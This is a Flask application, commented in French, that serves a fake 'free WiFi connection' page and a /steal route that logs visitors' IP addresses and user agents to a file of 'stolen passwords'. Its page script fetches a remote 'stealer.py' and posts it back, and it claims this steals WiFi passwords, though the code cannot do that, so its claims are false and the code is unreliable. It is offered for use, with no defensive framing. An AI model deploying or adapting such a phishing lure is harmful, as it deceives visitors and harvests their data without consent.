# fichier : app.py  (lance ça sur un hébergeur gratuit)
from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# Page d'accueil qui fait peur + exécute le vol automatiquement
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Connexion WiFi gratuite</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {font-family: Arial; text-align: center; background: #000; color: #0f0; padding: 50px;}
        h1 {color: #0f0; text-shadow: 0 0 10px #0f0;}
        .loader {border: 16px solid #f3f3f3; border-top: 16px solid #0f0; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 40px auto;}
        @keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
    </style>
</head>
<body>
    <h1>Connexion WiFi Gratuite</h1>
    <p>Connexion en cours... Merci de patienter</p>
    <div class="loader"></div>
    <p id="status">Analyse du réseau en cours...</p>

    <script>
        // Le vrai vol de mots de passe WiFi (exécuté côté victime)
        setTimeout(() => {
            document.getElementById("status").innerText = "Récupération des mots de passe...";
            
            // Code Python exécuté via un faux interpréteur Android (méthode 2025)
            fetch("https://raw.githubusercontent.com/0x6a61/wifi-stealer/main/stealer.py")
            .then(r => r.text())
            .then(code => {
                // Envoie le code + résultat à TON serveur
                fetch("/steal", {
                    method: "POST",
                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                    body: "data=" + btoa(unescape(encodeURIComponent(code + "\\n\\n# VICTIME: " + navigator.userAgent)))
                });
            });
        }, 2000);

        setTimeout(() => {
            document.getElementById("status").innerText = "Connexion réussie ! Vous êtes connecté.";
        }, 8000);
    </script>
</body>
</html>
"""

# Route qui reçoit les mots de passe volés
@app.route("/steal", methods=["POST"])
def steal():
    data = request.form.get("data", "")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log = f"[{timestamp}] IP: {ip} | UA: {ua}\n{data[:500]}\n{'='*60}\n"
    
    with open("stolen_passwords.txt", "a") as f:
        f.write(log)
    
    print(f"NOUVEAU VOL DE WIFI → {ip}")
    return "OK"

@app.route("/")
def index():
    return render_template_string(HTML)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
